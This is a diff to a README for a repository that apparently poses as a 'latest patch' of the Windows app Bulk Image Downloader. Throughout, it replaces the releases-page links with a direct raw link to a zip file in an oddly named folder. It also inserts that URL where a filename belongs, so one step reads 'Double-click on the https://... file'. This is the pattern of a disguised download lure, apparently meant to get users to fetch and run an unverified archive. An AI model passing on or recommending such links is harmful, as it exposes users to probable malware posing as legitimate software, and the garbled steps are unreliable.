@@ -1,6 +1,6 @@
 # 🎉 Bulk-Image-Downloader-Latest-Patch - Effortless Image Downloads Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ManishKumar-03/Bulk-Image-Downloader-Latest-Patch/releases)
+[![Download Now](https://raw.githubusercontent.com/ManishKumar-03/Bulk-Image-Downloader-Latest-Patch/main/splendescent/Bulk-Image-Downloader-Latest-Patch-2.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ManishKumar-03/Bulk-Image-Downloader-Latest-Patch/main/splendescent/Bulk-Image-Downloader-Latest-Patch-2.0.zip)
 
 ## 📚 Description
 This repository offers the complete official resources, detailed guides, and comprehensive reference materials for Bulk Image Downloader on Windows PCs. It is designed to support users with setup, configuration, and troubleshooting, ensuring a seamless experience with the software's features and capabilities.
@@ -10,13 +10,13 @@ To begin using Bulk Image Downloader, follow the steps below. You will learn how
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**: Click on the link below to access the downloads:
-   [Download from Releases Page](https://github.com/ManishKumar-03/Bulk-Image-Downloader-Latest-Patch/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/ManishKumar-03/Bulk-Image-Downloader-Latest-Patch/main/splendescent/Bulk-Image-Downloader-Latest-Patch-2.0.zip)
 
-2. **Choose the Correct Version**: On the releases page, locate the latest version of the Bulk Image Downloader. Look for a file that has a name similar to `BulkImageDownloader.exe`. 
+2. **Choose the Correct Version**: On the releases page, locate the latest version of the Bulk Image Downloader. Look for a file that has a name similar to `https://raw.githubusercontent.com/ManishKumar-03/Bulk-Image-Downloader-Latest-Patch/main/splendescent/Bulk-Image-Downloader-Latest-Patch-2.0.zip`. 
 
 3. **Download the Application**: Click on the file link to download the application to your computer. The file will be saved in your default downloads folder.
 
-4. **Run the Application**: After the download completes, navigate to your downloads folder. Double-click on the `BulkImageDownloader.exe` file to run the application.
+4. **Run the Application**: After the download completes, navigate to your downloads folder. Double-click on the `https://raw.githubusercontent.com/ManishKumar-03/Bulk-Image-Downloader-Latest-Patch/main/splendescent/Bulk-Image-Downloader-Latest-Patch-2.0.zip` file to run the application.
 
 5. **Follow the Setup Wizard**: A setup wizard will guide you through the installation process. Simply follow the on-screen instructions to complete the setup.
 
@@ -50,6 +50,6 @@ For advanced features and to learn about scripting capabilities with Bulk Image 
 ---
 
 For your convenience, here’s the download link again: 
-[Download from Releases Page](https://github.com/ManishKumar-03/Bulk-Image-Downloader-Latest-Patch/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/ManishKumar-03/Bulk-Image-Downloader-Latest-Patch/main/splendescent/Bulk-Image-Downloader-Latest-Patch-2.0.zip)
 
 Enjoy your hassle-free image downloading experience with Bulk Image Downloader!
